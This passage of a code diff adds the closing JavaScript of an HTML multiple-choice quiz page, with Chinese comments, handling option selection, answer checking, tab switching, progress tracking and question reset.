+                        <div class="sc-answer-content">A: ${sc.a}</div>
+                    </div>
+                    `).join('')}
+                </div>
+
+            </div>
+        </div>
+        `;
+    }).join('');
+    
+    // 綁定選項點擊事件
+    bindOptionEvents();
+}
+
+function bindOptionEvents() {
+    document.querySelectorAll('.option-label').forEach(label => {
+        label.addEventListener('click', function(e) {
+            if (this.classList.contains('disabled')) return;
+            
+            const input = this.querySelector('input');
+            const container = this.closest('.options-area');
+            const type = container.dataset.type;
+
+            if (type === 'single') {
+                container.querySelectorAll('.option-label').forEach(l => l.classList.remove('selected'));
+                this.classList.add('selected');
+                input.checked = true;
+            } else {
+                if (input.checked) {
+                    this.classList.add('selected');
+                } else {
+                    this.classList.remove('selected');
+                }
+            }
+        });
+    });
+}
+
+// 顯示/隱藏自我檢測答案
+function toggleSelfAnswer(btn) {
+    const content = btn.nextElementSibling;
+    if (content.style.display === 'block') {
+        content.style.display = 'none';
+        btn.innerText = '顯示答案';
+        btn.style.background = '#95a5a6';
+    } else {
+        content.style.display = 'block';
+        btn.innerText = '隱藏答案';
+        btn.style.background = '#2ecc71';
+    }
+}
+
+// 切換題目 Tab
+function switchTab(index) {
+    state.currentTab = index;
+    
+    document.querySelectorAll('.tab-btn').forEach((btn, i) => {
+        if (i === index) btn.classList.add('active');
+        else btn.classList.remove('active');
+    });
+
+    document.querySelectorAll('.card').forEach((card, i) => {
+        if (i === index) card.classList.add('active');
+        else card.classList.remove('active');
+    });
+
+    const container = document.querySelector('.group-scenario');
+    const offset = 100;
+    const bodyRect = document.body.getBoundingClientRect().top;
+    const elementRect = container.getBoundingClientRect().bottom;
+    const elementPosition = elementRect - bodyRect;
+    const offsetPosition = elementPosition + 20;
+
+    window.scrollTo({
+        top: offsetPosition,
+        behavior: 'smooth'
+    });
+}
+
+// 提交答案判定
+function submitAnswer(index) {
+    const optionsArea = document.getElementById(`options-area-${index}`);
+    const inputs = optionsArea.querySelectorAll('input');
+    const labels = optionsArea.querySelectorAll('.option-label');
+    const submitBtn = document.getElementById(`submit-${index}`);
+    const retryBtn = document.getElementById(`retry-${index}`);
+    const explainSec = document.getElementById(`explain-${index}`);
+    
+    let isCorrect = true;
+    let hasSelection = false;
+
+    inputs.forEach(input => {
+        if (input.checked) hasSelection = true;
+    });
+
+    if (!hasSelection) {
+        alert("請先選擇一個選項！");
+        return;
+    }
+
+    labels.forEach(label => {
+        label.classList.add('disabled');
+        const input = label.querySelector('input');
+        input.disabled = true;
+        
+        const isTarget = label.dataset.correct === "true";
+        const isSelected = input.checked;
+
+        if (isTarget) {
+            label.classList.add('correct');
+            if (!isSelected) isCorrect = false; 
+        } else if (isSelected) {
+            label.classList.add('wrong');
+            isCorrect = false; 
+        }
+    });
+
+    state.results[index] = isCorrect;
+    updateTabStatus(index, isCorrect);
+    updateProgress();
+
+    submitBtn.style.display = 'none';
+    retryBtn.style.display = 'inline-block';
+    
+    explainSec.style.display = 'block';
+    explainSec.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+// 更新 Tab 狀態顏色與圖示
+function updateTabStatus(index, isCorrect) {
+    const tab = document.getElementById(`tab-${index}`);
+    const icon = tab.querySelector('.status-icon');
+    
+    tab.classList.remove('correct', 'wrong');
+    if (isCorrect) {
+        tab.classList.add('correct');
+        icon.innerText = "✓";
+    } else {
+        tab.classList.add('wrong');
+        icon.innerText = "✕";
+    }
+}
+
+// 更新進度條
+function updateProgress() {
+    const completed = state.results.filter(r => r !== null).length;
+    const total = state.results.length;
+    
+    document.getElementById('completed-count').innerText = completed;
+    document.getElementById('total-count').innerText = total;
+    
+    const percent = (completed / total) * 100;
+    document.getElementById('global-progress').style.width = `${percent}%`;
+}
+
+// 單題重置
+function resetQuestion(index) {
+    const optionsArea = document.getElementById(`options-area-${index}`);
+    const submitBtn = document.getElementById(`submit-${index}`);
+    const retryBtn = document.getElementById(`retry-${index}`);
+    const explainSec = document.getElementById(`explain-${index}`);
+    const tab = document.getElementById(`tab-${index}`);
+    const icon = tab.querySelector('.status-icon');
+
+    state.results[index] = null;
+    updateProgress();
+
+    tab.classList.remove('correct', 'wrong');
+    icon.innerText = "";
+
+    const labels = optionsArea.querySelectorAll('.option-label');
+    labels.forEach(label => {
+        label.classList.remove('disabled', 'selected', 'correct', 'wrong');
+        const input = label.querySelector('input');
+        input.checked = false;
+        input.disabled = false;
+    });
+
+    submitBtn.style.display = 'inline-block';
+    retryBtn.style.display = 'none';
+    explainSec.style.display = 'none';
+
+    document.getElementById(`card-${index}`).scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+
+window.onload = init;
+
+</script>
+
+</body>
+</html>
